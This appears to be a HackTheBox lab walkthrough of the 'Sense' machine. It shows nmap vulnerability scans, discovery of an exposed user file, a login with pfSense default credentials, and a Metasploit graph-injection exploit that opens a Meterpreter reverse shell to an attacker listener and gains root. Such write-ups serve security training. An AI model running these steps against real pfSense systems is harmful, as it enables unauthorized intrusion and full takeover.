# Sense Walkthrough

![sense](https://raw.githubusercontent.com/SUNNYSAINI01001/HackTheBox/main/Sense/sense.png)

## Let's first do a fast scan on machine using nmap 

```
sudo nmap -F -sV 10.10.10.60
```

### Result

```
PORT    STATE SERVICE    VERSION 
80/tcp  open  http       lighttpd 1.4.35 
443/tcp open  ssl/https?
```

## Now let's do a berif scan too using nmap

```
sudo nmap -A -O -v --script vuln 10.10.10.60
```
### Result

```
PORT    STATE SERVICE    VERSION 
80/tcp  open  http       lighttpd 1.4.35 
|_http-server-header: lighttpd/1.4.35 
| http-slowloris-check:  
|   VULNERABLE: 
|   Slowloris DOS attack 
|     State: LIKELY VULNERABLE 
|     IDs:  CVE:CVE-2007-6750 
|       Slowloris tries to keep many connections to the target web server open and hold 
|       them open as long as possible.  It accomplishes this by opening connections to 
|       the target web server and sending a partial request. By doing so, it starves 
|       the http server's resources causing Denial Of Service. 
|        
|     Disclosure date: 2009-09-17 
|     References: 
|       http://ha.ckers.org/slowloris/ 
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750 
| vulners:  
|   cpe:/a:lighttpd:lighttpd:1.4.35:  
|       CVE-2019-11072  7.5     https://vulners.com/cve/CVE-2019-11072 
|       CVE-2014-2323   7.5     https://vulners.com/cve/CVE-2014-2323 
|       CVE-2018-19052  5.0     https://vulners.com/cve/CVE-2018-19052 
|       CVE-2015-3200   5.0     https://vulners.com/cve/CVE-2015-3200 
|_      CVE-2014-2324   5.0     https://vulners.com/cve/CVE-2014-2324 
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities. 
|_http-dombased-xss: Couldn't find any DOM based XSS. 
|_http-csrf: Couldn't find any CSRF vulnerabilities. 
|_http-vuln-cve2013-7091: ERROR: Script execution failed (use -d to debug) 
|_http-passwd: ERROR: Script execution failed (use -d to debug) 
443/tcp open  ssl/https? 
| ssl-ccs-injection:  
|   VULNERABLE: 
|   SSL/TLS MITM vulnerability (CCS Injection) 
|     State: VULNERABLE 
|     Risk factor: High 
|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h 
|       does not properly restrict processing of ChangeCipherSpec messages, 
|       which allows man-in-the-middle attackers to trigger use of a zero 
|       length master key in certain OpenSSL-to-OpenSSL communications, and 
|       consequently hijack sessions or obtain sensitive information, via 
|       a crafted TLS handshake, aka the "CCS Injection" vulnerability. 
|            
|     References: 
|       http://www.cvedetails.com/cve/2014-0224 
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224 
|_      http://www.openssl.org/news/secadv_20140605.txt 
| ssl-poodle:  
|   VULNERABLE: 
|   SSL POODLE information leak 
|     State: VULNERABLE 
|     IDs:  BID:70574  CVE:CVE-2014-3566 
|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other 
|           products, uses nondeterministic CBC padding, which makes it easier 
|           for man-in-the-middle attackers to obtain cleartext data via a 
|           padding-oracle attack, aka the "POODLE" issue. 
|     Disclosure date: 2014-10-14 
|     Check results: 
|       TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA 
|     References: 
|       https://www.securityfocus.com/bid/70574 
|       https://www.imperialviolet.org/2014/10/14/poodle.html 
|       https://www.openssl.org/~bodo/ssl-poodle.pdf 
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566 
| ssl-dh-params:  
|   VULNERABLE: 
|   Diffie-Hellman Key Exchange Insufficient Group Strength 
|     State: VULNERABLE 
|       Transport Layer Security (TLS) services that use Diffie-Hellman groups 
|       of insufficient strength, especially those using one of a few commonly 
|       shared groups, may be susceptible to passive eavesdropping attacks. 
|     Check results: 
|       WEAK DH GROUP 1 
|             Cipher Suite: TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA 
|             Modulus Type: Non-safe prime 
|             Modulus Source: RFC5114/1024-bit DSA group with 160-bit prime order subgroup 
|             Modulus Length: 1024 
|             Generator Length: 1024 
|             Public Key Length: 1024 
|     References: 
|_      https://weakdh.org 
|_http-aspnet-debug: ERROR: Script execution failed (use -d to debug) 
|_http-csrf: Couldn't find any CSRF vulnerabilities. 
|_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug) 
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities. 
|_http-dombased-xss: Couldn't find any DOM based XSS. 
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port 
Device type: specialized 
Running (JUST GUESSING): Comau embedded (92%) 
Aggressive OS guesses: Comau C4G robot control unit (92%) 
No exact OS matches for host (test conditions non-ideal). 
Uptime guess: 0.001 days (since Mon Apr  4 15:07:18 2022) 
Network Distance: 2 hops 
TCP Sequence Prediction: Difficulty=262 (Good luck!) 
IP ID Sequence Generation: Randomized 
 
TRACEROUTE (using port 80/tcp) 
HOP RTT       ADDRESS 
1   176.07 ms 10.10.14.1 
2   173.10 ms 10.10.10.60

```

## let's access  this port and enumerate further. 

## let's run gobuster for findng hidden directories, i use gui and result of gobuster given below

```
Files found during testing: 
 
Files found with a 200 responce: 
 
/changelog.txt 
/index.php 
/themes/pfsense_ng/javascript/niftyjsCode.js 
/csrf/csrf-magic.js 
/javascript/jquery.js 
/tree/tree.js 
/system-users.txt
```

## Here we got two txt file let's check what inside in this file. 

## i first access changelog.txt file image of that file content given below

![changelog](https://raw.githubusercontent.com/SUNNYSAINI01001/HackTheBox/main/Sense/changelog.png)

## it says 2 of 3 vulnerabilities have been pathced. that's means there is one vulnerability available now.

## On the second text file we got username and password

![sytemuser](https://raw.githubusercontent.com/SUNNYSAINI01001/HackTheBox/main/Sense/sytemuser.png)

## the username is rohit, here in password it shows comapny defaults after google search of default sense password we got a password i.e, pfsense , Now we have both username and password let's try to login.

![logon](https://raw.githubusercontent.com/SUNNYSAINI01001/HackTheBox/main/Sense/logon.png)

## we login sucessfully

## let's load metasploit and search for pfsense exploits

```
msf6 > search pfsense 
 
Matching Modules 
================ 
 
   #  Name                                            Disclosure Date  Rank       Check  Description 
   -  ----                                            ---------------  ----       -----  ----------- 
   0  exploit/unix/http/pfsense_clickjacking          2017-11-21       normal     No     Clickjacking Vulnerability In CSRF Error Page pfSense 
   1  exploit/unix/http/pfsense_diag_routes_webshell  2022-02-23       excellent  Yes    pfSense Diag Routes Web Shell Upload 
   2  exploit/unix/http/pfsense_graph_injection_exec  2016-04-18       excellent  No     pfSense authenticated graph status RCE 
   3  exploit/unix/http/pfsense_group_member_exec     2017-11-06       excellent  Yes    pfSense authenticated group member RCE 
 
Interact with a module by name or index. For example info 3, use 3 or use exploit/unix/http/pfsense_group_member_exec
```

## we know we have rrd graph in sense page after login . let's use graph injection modules.

```
msf6 > use exploit/unix/http/pfsense_graph_injection_exec
```

##  And then set options .

```
msf6 exploit(unix/http/pfsense_graph_injection_exec) > show options 
 
Module options (exploit/unix/http/pfsense_graph_injection_exec): 
 
   Name      Current Setting  Required  Description 
   ----      ---------------  --------  ----------- 
   PASSWORD  pfsense          yes       Password to login with 
   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...] 
   RHOSTS    10.10.10.60      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Me 
                                        tasploit 
   RPORT     443              yes       The target port (TCP) 
   SSL       true             no        Negotiate SSL/TLS for outgoing connections 
   USERNAME  rohit            yes       User to login with 
   VHOST                      no        HTTP server virtual host 
 
 
Payload options (php/meterpreter/reverse_tcp): 
 
   Name   Current Setting  Required  Description 
   ----   ---------------  --------  ----------- 
   LHOST  10.10.14.5       yes       The listen address (an interface may be specified) 
   LPORT  4444             yes       The listen port 
 
 
Exploit target: 
 
   Id  Name 
   --  ---- 
   0   Automatic Target 
```

## now run the exploit 

```
msf6 exploit(unix/http/pfsense_graph_injection_exec) > run 
 
[*] Started reverse TCP handler on 10.10.14.5:4444  
[*] Detected pfSense 2.1.3-RELEASE, uploading intial payload 
[*] Payload uploaded successfully, executing 
[*] Sending stage (39282 bytes) to 10.10.10.60 
[+] Deleted saLxrV 
[*] Meterpreter session 1 opened (10.10.14.5:4444 -> 10.10.10.60:64670 ) at 2022-04-05 08:51:48 +0530 
 
meterpreter > shell 
Process 74527 created. 
Channel 0 created. 
whoami 
root
```

# BOOOMMM!!! WE GOT ROOT SHELL

![ROOT](https://c.tenor.com/Oj2nKJiZSU4AAAAC/celebration-will-smith.gif)
